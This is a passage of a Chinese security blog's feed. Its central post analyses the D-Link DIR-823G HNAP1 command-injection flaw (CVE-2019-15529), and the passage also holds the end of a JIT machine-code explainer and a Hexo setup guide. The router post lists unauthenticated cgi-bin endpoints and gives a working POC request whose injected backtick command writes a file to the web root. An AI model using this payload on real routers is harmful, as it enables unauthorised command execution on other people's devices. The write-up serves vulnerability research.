class="hljs-built_in">rdi</span>，第二个参数使用 <span class="hljs-built_in">rsi</span>，等等。所以 <span class="hljs-built_in">edi</span> 里存的其实就是第一个参数，也就是整数 <span class="hljs-number">3</span><br>  <span class="hljs-number">40052d</span>:8b <span class="hljs-number">45</span> fc             <span class="hljs-keyword">mov</span>    -<span class="hljs-number">0x4</span>(%rbp),%eax#把上一步存到栈上的那个整数再存进 <span class="hljs-built_in">eax</span> 中<br>  <span class="hljs-number">400530</span>:<span class="hljs-number">83</span> c0 <span class="hljs-number">01</span>             <span class="hljs-keyword">add</span>    <span class="hljs-number">$0</span>x1,%eax#把 <span class="hljs-built_in">eax</span> 加上 <span class="hljs-number">1</span>， 然后就退栈，返回。按照x64的规定（ABI），返回值通过<span class="hljs-built_in">eax</span>传递<br>  <span class="hljs-number">400533</span>:<span class="hljs-number">5d</span>                   <span class="hljs-keyword">pop</span>    %rbp<br>  <span class="hljs-number">400534</span>:c3                   retq   <br></code></pre></td></tr></tbody></table></figure><p>我们发现，第三局第四局好像没有必要，gcc默认情况下生成的机器码有点没必要，它总要把入参放到栈上，但其实我们是可以直接把参数从rdi中放入到rax中的，在运行时修改inc的逻辑即可：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;memory.h&gt;</span></span><br> <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(* inc_func)</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span>; <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{<br>    <span class="hljs-type">char</span> code[] = { <br>        <span class="hljs-number">0x55</span>,             <span class="hljs-comment">// push rbp</span><br>        <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-comment">// mov rsp, rbp</span><br>        <span class="hljs-number">0x89</span>, <span class="hljs-number">0xf8</span>,       <span class="hljs-comment">// mov edi, eax</span><br>        <span class="hljs-number">0x83</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x01</span>, <span class="hljs-comment">// add $1, eax</span><br>        <span class="hljs-number">0x5d</span>,             <span class="hljs-comment">// pop rbp</span><br>        <span class="hljs-number">0xc3</span>              <span class="hljs-comment">// ret</span><br>    };  <br>    <span class="hljs-type">void</span> * temp = <span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">sizeof</span>(code), PROT_WRITE | PROT_EXEC,<br>            MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>); <br>    <span class="hljs-built_in">memcpy</span>(temp, code, <span class="hljs-built_in">sizeof</span>(code));<br>    inc_func p_inc = (inc_func)temp;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, <span class="hljs-built_in">p_inc</span>(<span class="hljs-number">7</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>mmap申请了一块有写权限和执行权限的内存，然后将手写的机器码考进去，使用一个函数指针指向这块内存并调用它，通过这种方式就可以执行这一段手写的机器码了。</p><p>我们通过手写机器码将原来的inc函数代替掉了，在新的例子中，我们使用程序中定义的数据来重新造了一个inc函数，这种在运行过程创建新的函数的方式，就是JIT的核心操作。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JIT原理&quot;&gt;&lt;a href=&quot;#JIT原理&quot; class=&quot;headerlink&quot; title=&quot;JIT原理&quot;&gt;&lt;/a&gt;JIT原理&lt;/h2&gt;&lt;p&gt;Just In Time编译，也叫运行时编译，不同于C/C++语言直接被翻译成机器指令，javac把java的源文件</summary>
      
    
    
    
    
    <category term="chrome知识点" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>Dlink DIR-823G 漏洞挖掘过程</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/</id>
    <published>2022-08-09T03:17:04.104Z</published>
    <updated>2022-08-09T03:39:15.963Z</updated>
    
    <content type="html"><![CDATA[<p>固件下载地址： <a href="https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA">https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA</a> 提取码：1ly1</p><h1 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h1><p><b>D-Link DIR-823G命令注入漏洞：</b></p><p>CVE编号：CVE-2019-15529</p><p>D-Link DIR-823G是中国台湾友讯（D-Link）公司的一款无线路由器。使用1.0.2B05版本固件的D-Link DIR-823G中的HNAP1存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。 </p><h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h1><ul><li>binwalk -Me 固件.bin //解开固件</li></ul><p><img src="https://i.loli.net/2020/09/24/p67xmQnKZ83I4Hy.png" alt="捕获.PNG"></p><p>是一个squashfs文件系统，标准linux目录结构。</p><ul><li>cat /etc/init.d/rcS //查看路由器开启的服务。</li></ul><p>发现一个goahead进程。</p><blockquote><p>GoAhead(嵌入式Web服务器)，GoAhead自身实现一个web服务器所需提供的基本功能，提供多种方法供扩展服务器的功能，包括asp过程、goforms过程。用户定制型非常强，可通过goaead的api定义url处理函数和可供asp文件中调用的函数。<br><code>websUrlHandlerDefine(T("/goform"), NULL, 0, websFormHandler, 0);</code> /goform的请求交给websFormHandler函数处理<br><code>websUrlHandlerDefine(T("/cgi-bin"), NULL, 0, websCgiHandler, 0);</code> /cgi-bin的请求交给websCgiHandler函数处理。</p></blockquote><h2 id="模拟运行固件"><a href="#模拟运行固件" class="headerlink" title="模拟运行固件"></a>模拟运行固件</h2><p>环境使用工具firmware-ayalysis-toolkit。</p><p>搭建教程：<a href="https://zhuanlan.zhihu.com/p/110806057">https://zhuanlan.zhihu.com/p/110806057</a></p><p>运行起来后nmap扫端口，发现开了http服务和dns服务。</p><p>访问<a href="http://192.168.0.1,可看到dlink登录页面.要求用户做一些设置,不需要密码即可登录./">http://192.168.0.1,可看到Dlink登录页面。要求用户做一些设置，不需要密码即可登录。</a></p><p><img src="https://i.loli.net/2020/09/24/QizkImP7T8lfOuw.png" alt="捕获.PNG"></p><p>在固件解压的文件下找到名为 web_mtn的文件，应该是web目录。其中cgi-bin目录下存放的cgi文件可以非授权访问，可能造成影响。</p><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p><b><code>/cgi-bin/ExportSettings.sh</code> 导出配置文件，造成信息泄露。</b></p><p><img src="https://i.loli.net/2020/09/24/Eewn8h6ApNbuyYW.png" alt="捕获.PNG"></p><p><b><code>/cgi-bin/upload_settings.cgi</code> 导入配置文件，可导入恶意篡改后的配置。</b></p><p><img src="https://i.loli.net/2020/09/24/oDs9v3ulnqfLOFd.png" alt="捕获.PNG"></p><p><b><code>/cgi-bin/GetDownLoadSyslog.sh</code> 获取系统部分启动信息<code>/var/log/messages*</code></b></p><p><img src="https://i.loli.net/2020/09/24/uqGwiQNa2eHz3CB.png" alt="捕获.PNG"></p><p><b><code>/cgi-bin/upload_firmware.cgi</code> 上传更新固件，可恶意修改固件</b></p><h2 id="goahead-自定义的请求处理函数"><a href="#goahead-自定义的请求处理函数" class="headerlink" title="goahead 自定义的请求处理函数"></a>goahead 自定义的请求处理函数</h2><blockquote><p>处理函数的参数列表：<br>int websCgiHandler(webs_t wp, char_t *urlPrefix, char_t *webDir, int arg, char_t *url, char_t <em>path, char_t</em> query)<br>goForms过程:它主要用来响应用户输入以更新系统设置或者执行特定的动作。在GoAhead中，goForms实现为一个URL处理器，它会解释以”/goform”开始的URLs。紧跟着”goform”之后的字符串定义了表单名字和用户请求的细节.</p></blockquote><p>IDA打开goahead分析：</p><p>通过字符串/cgi-bin或/goform找到定义url的函数位置。交叉引用，发现注册处理函数位置为0x42424C.</p><p><img src="https://i.loli.net/2020/09/24/awysHvo6RAzcgI7.png" alt="捕获.PNG"></p><p>websUrlHandlerDefine 的第一个参数为 url, 第四个参数应该就是相应 url 的处理函数。</p><p>抓取登录数据包，发现往/HNAP1发送。</p><p><img src="https://i.loli.net/2020/09/24/ARI7bVkUMSxZuDJ.png" alt="捕获.PNG"></p><p>分析/HNAP1（0x42383C）处理函数逻辑:</p><p><img src="https://i.loli.net/2020/09/24/EHM2wAsrvhCTJdj.png" alt="捕获.PNG"></p><p>从 wp 结构体中取出此次请求需要调用的函数名，然后去全局函数表里面搜索，找到之后在进行处理。</p><p>找到需要调用的处理函数后，会首先记录POST原始报文。这里记录日志首先是用snprintf生成命令，然后system执行。</p><p><img src="https://i.loli.net/2020/09/24/XD2TKt8ClQEZ6Af.png" alt="捕获.PNG"></p><p>此处可以直接注入’来命令执行。</p><blockquote><p>在PHP中常用到以下几个函数来执行外部命令:<br>system</p><blockquote><p>system()函数能够将字符串作为OS命令执行，并自带输出到当前页面的功能</p></blockquote><p>exec<br>passthru<br>shell_exec</p></blockquote><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight makefile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile">POST /HNAP1/ HTTP/1.1<br><span class="hljs-section">Host: 192.168.0.1</span><br><span class="hljs-section">Content-Length: 53</span><br><span class="hljs-section">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</span><br><span class="hljs-section">Content-Type: text/xml; charset=UTF-8</span><br><span class="hljs-section">Accept: */*</span><br><span class="hljs-section">SOAPAction: "http://purenetworks.com/HNAP1/Login"</span><br><span class="hljs-section">Accept-Encoding: gzip, deflate</span><br><span class="hljs-section">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="hljs-section">Connection: close</span><br>'`echo hacked_by_hac425!!!!!!!! &gt; /web_mtn/hack.txt`'<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;固件下载地址： &lt;a href=&quot;https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA&quot;&gt;https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA&lt;/a&gt; 提取码：1ly1&lt;/p&gt;
&lt;h1 id</summary>
      
    
    
    
    
    <category term="IOT" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>Win10下使用Hexo搭建个人博客</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</id>
    <published>2022-08-07T08:48:45.000Z</published>
    <updated>2022-08-07T13:51:00.834Z</updated>
    
    <content type="html"><![CDATA[<h2 id="下载安装git、nodejs"><a href="#下载安装git、nodejs" class="headerlink" title="下载安装git、nodejs"></a>下载安装git、nodejs</h2><p>下载地址: </p><p>git: <a href="https://git-scm.com/">https://git-scm.com/</a> </p><p>nodejs: <a href="http://nodejs.cn/download/">http://nodejs.cn/download/</a></p><p>将nodejs加入path环境变量中。打开cmd测试：</p><p><img src="https://s2.loli.net/2022/08/07/NduraiRMcEQythF.png" alt="图片.png"></p><blockquote><p>报错1：输入 <code>npm-v</code> 出现报错:</p></blockquote><pre><code>npm WARN config global --global, --local are deprecated. Use `–location</code></pre><p>解决方法：打开<code>nodejs</code>安装位置文件夹，打开<code>npm.cmd</code>和<code>npm</code>，将文件中的<code>prefix -g</code>替换为<code>prefix --location=global</code>,保存后重新打开cmd测试即可。</p><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><h3 id="换源（淘宝源）"><a href="#换源（淘宝源）" class="headerlink" title="换源（淘宝源）"></a>换源（淘宝源）</h3><pre><code>npm install -g cnpm --registry=https://registry.npm.taobao.orgcnpm -v </code></pre><p><img src="https://s2.loli.net/2022/08/07/9zM1KhnkOqAFsU6.png" alt="图片.png"></p><p>查看版本以及是否安装成功。</p><h3 id="安装hexo-1"><a href="#安装hexo-1" class="headerlink" title="安装hexo"></a>安装hexo</h3><pre><code>cnpm install -g hexo-clihexo -v</code></pre><p>新建文件夹放置博客内容，在cmd中进入所建立的目录：</p><pre><code>hexo init #初始化hexohexo s #启动hexo</code></pre><p>访问 <code> http://localhost:4000/</code>如下即成功：</p><p><img src="https://s2.loli.net/2022/08/07/dvIiunG5yhOEUX8.png" alt="图片.png"></p><h2 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h2><pre><code>hexo new &quot;文章标题&quot;</code></pre><p>在目录&#x2F;source&#x2F;_posts&#x2F;下生成文件.md<br>更新文章：<br>    hexo clean<br>    hexo g<br>    hexo s</p><h2 id="部署github"><a href="#部署github" class="headerlink" title="部署github"></a>部署github</h2><p>1、建立一个新的库，命名需要符合规则：<code>username.gitgub.io</code><br>2、命令行输入：</p><pre><code>cnpm install --save hexo-deployer-git  </code></pre><p>3、更改设置</p><p>找到_config.yml文件，翻到最底部</p><p>将<code>type</code>改为<code>git</code></p><p>添加<code>repo: &quot;此处为仓库地址&quot;</code></p><p>添加<code>branch: master</code></p><p>repo为仓库地址 branch为master即可</p><p><img src="https://s2.loli.net/2022/08/07/akWVI3mUinyP2sJ.png" alt="图片.png"></p><p>4、部署到远端</p><pre><code>git config --global user.email &quot;xxx(此处为邮箱)&quot;  git config --global user.name &quot;xxx(此处为用户名)&quot;  #github用户名hexo d  </code></pre><p>弹出网页提示是否关联git和github 授权即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;下载安装git、nodejs&quot;&gt;&lt;a href=&quot;#下载安装git、nodejs&quot; class=&quot;headerlink&quot; title=&quot;下载安装git、nodejs&quot;&gt;&lt;/a&gt;下载安装git、nodejs&lt;/h2&gt;&lt;p&gt;下载地址: &lt;/p&gt;
&lt;p&gt;git: &lt;a </summary>
      
    
    
    
    
  </entry>
  
</feed>
